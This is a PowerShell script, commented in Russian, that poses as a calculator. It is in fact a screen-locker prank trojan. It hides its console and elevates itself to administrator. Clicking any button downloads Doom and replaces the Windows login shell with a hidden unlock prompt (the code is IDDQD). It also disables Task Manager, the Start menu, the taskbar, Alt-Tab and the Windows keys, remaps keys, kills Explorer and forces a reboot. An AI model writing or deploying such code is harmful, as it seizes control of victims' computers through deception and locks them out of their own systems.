$t = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
add-type -name win -member $t -namespace native
[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0)

# Запуск с правами администратора
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`"" -Verb RunAs
    exit
}

Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.Application]::EnableVisualStyles()

# Конфигурационные переменные
$installDir = "C:\Doom"
$doomUrl = "https://github.com/fabiangreffrath/crispy-doom/releases/download/crispy-doom-7.0/crispy-doom-7.0.0-win64.zip"
$iwadFile = "$installDir\doom1.wad"
$unlockScriptPath = "$installDir\unlock.ps1"

# Создать скрипт разблокировки
$unlockScriptContent = @'
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName Microsoft.VisualBasic

$code = [Microsoft.VisualBasic.Interaction]::InputBox("Enter code to exit Doom mode:", "Authorization Required", "")
$correctCode = "IDDQD"

if ($code -eq $correctCode) {
    # Восстановление реестра
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Shell" -Value "explorer.exe" -Force
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "AutoRestartShell" -Value 1 -Force

    # Явный сброс всех политик
    Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Name "NoStartMenu", "NoTaskbar", "NoWinKeys", "NoRun" -ErrorAction SilentlyContinue
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr", "NoAltTab" -ErrorAction SilentlyContinue
    reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "Scancode Map" /f 2>&1 | Out-Null

    # Принудительный запуск Explorer и перезагрузка
    Start-Process "explorer.exe" -WindowStyle Maximized
    taskkill /im crispy-doom.exe /f 2>&1 | Out-Null
    
    # Задержка перед перезагрузкой
    [System.Windows.Forms.MessageBox]::Show($messages.Success, "Success", 0, 64)
    Start-Sleep -Seconds 3
    Restart-Computer -Force
} else {
    # Запуск Doom с сообщением
    Start-Process "cmd.exe" "/c start /max C:\Doom\crispy-doom.exe "
    [System.Windows.Forms.MessageBox]::Show("Wrong code! Lets play again! YAY YAY YAY!","ERROR",0,16)
    exit
}
'@
New-Item -Path $unlockScriptPath -ItemType File -Force -Value $unlockScriptContent

# Создание формы калькулятора
$calcForm = New-Object System.Windows.Forms.Form
$calcForm.Text = "Calculator"
$calcForm.Size = New-Object System.Drawing.Size(300,400)
$calcForm.StartPosition = "CenterScreen"
$calcForm.FormBorderStyle = "FixedSingle"
$calcForm.MaximizeBox = $false
$calcForm.BackColor = "#F0F0F0"
$calcForm.Add_FormClosing({ $_.Cancel = $true })

# Поле вывода
$display = New-Object System.Windows.Forms.TextBox
$display.Location = New-Object System.Drawing.Point(10,10)
$display.Size = New-Object System.Drawing.Size(260,40)
$display.Font = New-Object System.Drawing.Font("Arial",14)
$display.TextAlign = "Right"
$display.ReadOnly = $true
$calcForm.Controls.Add($display)

# Генерация кнопок
$layout = @(
    @("7", 10, 60), @("8", 80, 60), @("9", 150, 60), @("/", 220, 60),
    @("4", 10, 110), @("5", 80, 110), @("6", 150, 110), @("*", 220, 110),
    @("1", 10, 160), @("2", 80, 160), @("3", 150, 160), @("-", 220, 160),
    @("0", 10, 210), @(".", 80, 210), @("=", 150, 210), @("+", 220, 210)
)

foreach ($btn in $layout) {
    $button = New-Object System.Windows.Forms.Button
    $button.Text = $btn[0]
    $button.Location = New-Object System.Drawing.Point($btn[1], $btn[2])
    $button.Size = New-Object System.Drawing.Size(60,40)
    $button.Font = New-Object System.Drawing.Font("Arial",12)
    $button.Add_Click({
        $calcForm.Close()
        Start-DoomInstallation
    })
    $calcForm.Controls.Add($button)
}

function Start-DoomInstallation {
    try {
        # Создание папки
        New-Item -Path $installDir -ItemType Directory -Force -ErrorAction Stop
        
        # Скачивание Doom
        $zipPath = "$installDir\doom.zip"
        Invoke-WebRequest -Uri $doomUrl -OutFile $zipPath -ErrorAction Stop
        Expand-Archive -Path $zipPath -DestinationPath $installDir -Force -ErrorAction Stop

        $doomUrl="https://github.com/freedoom/freedoom/releases/download/v0.13.0/freedoom-0.13.0.zip"
        Invoke-WebRequest -Uri $doomUrl -OutFile $zipPath -ErrorAction Stop
        Expand-Archive -Path $zipPath -DestinationPath $installDir -Force -ErrorAction Stop
        mv C:\Doom\freedoom-0.13.0\freedoom1.wad $installDir\freedoom1.wad


        # Настройка окружения
        [Environment]::SetEnvironmentVariable("PATH", "$env:PATH;$installDir", "Machine")

        # Настройка автозапуска скрипта проверки
        $winlogonPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
        Set-ItemProperty -Path $winlogonPath -Name "Shell" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$unlockScriptPath`"" -Force
        Set-ItemProperty -Path $winlogonPath -Name "AutoRestartShell" -Value 0 -Type DWord -Force

        # Блокировка интерфейса
        $explorerPolicies = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer"
        Set-ItemProperty -Path $explorerPolicies -Name "NoStartMenu" -Value 1 -Type DWord -Force
        Set-ItemProperty -Path $explorerPolicies -Name "NoTaskbar" -Value 1 -Type DWord -Force
        Set-ItemProperty -Path $explorerPolicies -Name "NoWinKeys" -Value 1 -Type DWord -Force
        Set-ItemProperty -Path $explorerPolicies -Name "NoRun" -Value 1 -Type DWord -Force

        # Системные политики
        $systemPolicies = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System"
        Set-ItemProperty -Path $systemPolicies -Name "DisableTaskMgr" -Value 1 -Type DWord -Force
        Set-ItemProperty -Path $systemPolicies -Name "NoAltTab" -Value 1 -Type DWord -Force

        # Блокировка клавиш
        reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" `
            /v "Scancode Map" /t REG_BINARY /d 00000000000000000300000000001d00000038e000005be000000000 /f

        # Остановка Explorer
        Stop-Process -Name "explorer" -Force -ErrorAction SilentlyContinue

        # Финализация
        Write-Host "Система будет перезагружена через 5 секунд..." -ForegroundColor Red
        Start-Sleep -Seconds 5
        Restart-Computer -Force
    }
    catch {
        Write-Host "Ошибка: $_" -ForegroundColor Red
        Read-Host "Нажмите Enter для выхода"
        exit 1
    }
}
# Block keyboard interrupts
[Console]::TreatControlCAsInput = $true
Register-EngineEvent -SourceIdentifier PowerShell.Exiting -Action { exit }
[void]$calcForm.ShowDialog()
